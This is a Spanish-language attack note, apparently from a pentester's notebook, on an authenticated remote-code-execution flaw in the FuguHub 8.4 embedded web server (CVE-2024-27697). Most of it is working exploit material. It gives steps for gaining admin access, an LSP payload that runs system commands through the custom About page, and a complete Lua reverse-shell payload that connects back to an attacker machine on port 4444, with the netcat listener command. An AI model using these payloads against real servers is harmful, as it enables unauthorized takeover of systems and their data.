# FuguHub 

Tags: #FuguHub 

FuguHub es un servidor web embebido (embedded web server) que también funciona como una plataforma para publicar aplicaciones web y compartir archivos. Está pensado para que un administrador pueda gestionar usuarios, permisos, aplicaciones y servicios desde una interfaz web.

## Versión 8.4 RCE - Autenticado 

* [CVE-2024-27697](https://github.com/SanjinDedic/FuguHub-8.4-Authenticated-RCE-CVE-2024-27697)

```bash 
Paso 1:
- Crear el usuario admin:admin123, esto te lo permite la misma aplicación el cual lo agrega como aadministrador del panel. Esto sucede por la 'misconfiguration' de la aplicación 

Paso 2:
# Ruta vulnerable 
	Menu > Administrator Panel > Cuztomize Server 
```

![[HubPanel.png]]


```bash 
Paso 4: 
# Ejecutar código LSP
# Payload para la validación del comando 'id'

<?lsp
local io = require("io")

local f = io.popen("id")
local output = f:read("*a")
f:close()

response:write("<pre>")
response:write(output)
response:write("</pre>")
?>


NOTA:
	- Al finalizar dar click en 'Set Custom About Page' para que se apliquen los cambios 
```

```bash 
Paso 5:
# Validación de los comandos en:
	https://IP/rtl/about.lsp
```

```bash 
Paso 6:
# Payload para la ejecución del RCE

<?lsp
local host, port = "IP_Kali", 4444
local socket = require("socket")
local tcp = socket.tcp()
local io = require("io")
tcp:connect(host, port)
while true do
    local cmd, status, partial = tcp:receive()
    local f = io.popen(cmd, "r")
    local s = f:read("*a")
    f:close()
    tcp:send(s)
    if status == "closed" then break end
end
tcp:close()
?>
```

```bash 
❯ nc -nlvp 4444     # Modo escucha para recibir la Revershell 
```